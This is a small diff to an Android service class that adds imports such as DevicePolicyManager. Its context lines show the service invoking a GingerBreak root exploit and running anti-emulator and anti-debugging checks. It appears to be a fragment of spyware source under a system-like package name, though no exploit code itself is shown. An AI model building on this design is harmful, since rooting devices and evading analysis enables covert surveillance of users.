@@ -1,14 +1,20 @@
 package com.android.networking;
 
+import java.io.IOException;
+
 import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.res.Configuration;
 import android.os.IBinder;
 import android.widget.Toast;
 
 import com.android.networking.auto.Cfg;
+import com.android.networking.capabilities.PackageInfo;
+import com.android.networking.listener.AR;
 import com.android.networking.util.Check;
 
 /**
@@ -86,7 +92,6 @@ public class ServiceMain extends Service {
 			if (Cfg.EXP) {
 				root.runGingerBreak();
 			}
-
 		}else{
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart) anti emu/debug failed");
